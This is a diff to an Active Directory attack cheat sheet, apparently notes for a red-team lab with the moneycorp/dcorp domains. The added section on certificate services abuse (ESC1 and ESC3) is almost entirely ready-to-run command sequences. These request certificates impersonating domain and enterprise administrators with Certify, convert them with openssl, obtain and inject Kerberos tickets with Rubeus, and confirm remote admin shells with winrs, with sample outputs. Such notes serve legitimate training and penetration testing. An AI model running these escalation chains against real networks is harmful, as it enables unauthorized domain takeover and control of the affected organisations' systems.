@@ -1730,79 +1730,188 @@ Get-SQLServerLinkCrawl -Instance dcorp-mssql
 
 ## SECTION 8: ACTIVE DIRECTORY CERTIFICATE SERVICES
 
-### ESC1 - Vulnerable Certificate Template
+### ESC1 - Vulnerable Certificate Template (Enrollee Supplies Subject)
 
 **Vulnerability Requirements:**
-- Template allows `ENROLLEE_SUPPLIES_SUBJECT`
+- Template allows `ENROLLEE_SUPPLIES_SUBJECT` flag
 - Has Client Authentication EKU
-- User has enrollment rights
+- User has enrollment rights on template
 
-#### Exploitation
+**Detection:**
 ```powershell
-# 1. Find vulnerable templates
-Certify.exe find /enrolleeSuppliesSubject
+# Check if AD CS exists
+Certify.exe cas
 
-# 2. Request cert for DA
+# List all templates
+Certify.exe find
+
+# Find ESC1 vulnerable templates specifically
+Certify.exe find /enrolleeSuppliesSubject
+```
+
+**ESC1 → Domain Admin Escalation**
+
+```powershell
+# 1. Request certificate for Domain Admin
 Certify.exe request 
   /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
   /template:HTTPSCertificates
   /altname:administrator
-  /sid:S-1-5-21-335606122-960912869-3279953914-500
+  /sid:S-1-5-21-719815819-3726368948-3917688648-500
 
-# 3. Convert to PFX (interactive password)
+# Output: cert.pem with BEGIN RSA PRIVATE KEY and END CERTIFICATE sections
+
+# 2. Convert to PFX (save cert.pem text first)
 openssl.exe pkcs12 
   -in cert.pem 
   -keyex 
-  -CSP "Microsoft Enhanced Cryptographic Provider v1.0"
+  -CSP "Microsoft Enhanced Cryptographic Provider v1.0" 
   -export 
-  -out cert.pfx
+  -out esc1-DA.pfx
+# Prompted for export password (e.g., SecretPass@123)
 
-# 4. Request TGT with certificate
+# 3. Request TGT with certificate
 Rubeus.exe asktgt 
-  /user:Administrator
-  /certificate:cert.pfx
-  /password:password
+  /user:administrator
+  /certificate:esc1-DA.pfx
+  /password:SecretPass@123
   /ptt
 
-# 5. Verify DA access
-winrs -r:dc cmd
+# 4. Verify DA access
+winrs -r:dcorp-dc cmd /c set username
+# Output: USERNAME=administrator
+```
+
+**ESC1 → Enterprise Admin Escalation**
+
+```powershell
+# 1. Request certificate for parent domain Administrator
+Certify.exe request 
+  /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+  /template:HTTPSCertificates
+  /altname:moneycorp.local\administrator
+  /sid:S-1-5-21-335606122-960912869-3279953914-500
+
+# 2. Convert to PFX
+openssl.exe pkcs12 
+  -in esc1-EA.pem 
+  -keyex 
+  -CSP "Microsoft Enhanced Cryptographic Provider v1.0" 
+  -export 
+  -out esc1-EA.pfx
+
+# 3. Request TGT for parent domain Administrator
+Rubeus.exe asktgt 
+  /user:moneycorp.local\administrator
+  /dc:mcorp-dc.moneycorp.local
+  /certificate:esc1-EA.pfx
+  /password:SecretPass@123
+  /ptt
+
+# 4. Verify EA access
+winrs -r:mcorp-dc cmd /c set username
+# Output: USERNAME=administrator
 ```
 
 ### ESC3 - Enrollment Agent + Signed Requests
 
 **Vulnerability Requirements:**
-- ESC3a: Enrollment Agent template with user rights
-- ESC3b: Signed request template
+- ESC3a: Enrollment Agent template (Certificate Request Agent EKU) with user enrollment rights
+- ESC3b: Signed request template (application policy of Certificate Request Agent, allows domain authentication EKU)
+- Both templates typically with AUTO_ENROLLMENT flag
 
-#### Exploitation
+**Detection:**
 ```powershell
-# 1. Request Enrollment Agent certificate
+# Find vulnerable templates
+Certify.exe find /vulnerable
+
+# Look for:
+# - SmartCardEnrollment-Agent (with Certificate Request Agent EKU)
+# - SmartCardEnrollment-Users (with Application Policies: Certificate Request Agent)
+```
+
+**ESC3 → Domain Admin Escalation**
+
+```powershell
+# 1. Request Enrollment Agent certificate (from SmartCardEnrollment-Agent)
 Certify.exe request 
-  /ca:ca-server\ca-name
+  /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
   /template:SmartCardEnrollment-Agent
 
+# Output: esc3.pem with certificate and private key
+
 # 2. Convert agent cert to PFX
-openssl.exe pkcs12 -in agent.pem ... -out agent.pfx
+openssl.exe pkcs12 
+  -in esc3.pem 
+  -keyex 
+  -CSP "Microsoft Enhanced Cryptographic Provider v1.0" 
+  -export 
+  -out esc3-agent.pfx
 
-# 3. Use agent cert to request target cert
+# 3. Use agent cert to request DA certificate (from SmartCardEnrollment-Users, on behalf of DA)
 Certify.exe request 
-  /ca:ca-server\ca-name
+  /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
   /template:SmartCardEnrollment-Users
-  /onbehalfof:domain\Administrator
-  /enrollcert:agent.pfx
-  /enrollcertpw:password
+  /onbehalfof:dcorp\administrator
+  /enrollcert:esc3-agent.pfx
+  /enrollcertpw:SecretPass@123
 
-# 4. Convert target cert to PFX
-openssl.exe pkcs12 -in target.pem ... -out target.pfx
+# Output: esc3-DA.pem with DA certificate
 
-# 5. Request TGT with target cert
+# 4. Convert DA cert to PFX
+openssl.exe pkcs12 
+  -in esc3-DA.pem 
+  -keyex 
+  -CSP "Microsoft Enhanced Cryptographic Provider v1.0" 
+  -export 
+  -out esc3-DA.pfx
+
+# 5. Request TGT with DA certificate
 Rubeus.exe asktgt 
-  /user:Administrator
-  /certificate:target.pfx
-  /password:password
+  /user:administrator
+  /certificate:esc3-DA.pfx
+  /password:SecretPass@123
   /ptt
 
-# Result: DA access via certificate authentication
+# 6. Verify DA access
+winrs -r:dcorp-dc cmd /c set username
+# Output: USERNAME=administrator
+```
+
+**ESC3 → Enterprise Admin Escalation**
+
+```powershell
+# Reuse esc3-agent.pfx from step 2 above
+
+# 1. Request EA certificate (from SmartCardEnrollment-Users, on behalf of parent domain EA)
+Certify.exe request 
+  /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+  /template:SmartCardEnrollment-Users
+  /onbehalfof:mcorp\administrator
+  /enrollcert:esc3-agent.pfx
+  /enrollcertpw:SecretPass@123
+
+# Output: esc3-EA.pem
+
+# 2. Convert EA cert to PFX
+openssl.exe pkcs12 
+  -in esc3-EA.pem 
+  -keyex 
+  -CSP "Microsoft Enhanced Cryptographic Provider v1.0" 
+  -export 
+  -out esc3-EA.pfx
+
+# 3. Request TGT for parent domain Administrator
+Rubeus.exe asktgt 
+  /user:moneycorp.local\administrator
+  /certificate:esc3-EA.pfx
+  /dc:mcorp-dc.moneycorp.local
+  /password:SecretPass@123
+  /ptt
+
+# 4. Verify EA access
+winrs -r:mcorp-dc cmd /c set username
+# Output: USERNAME=administrator
 ```
 
 ---
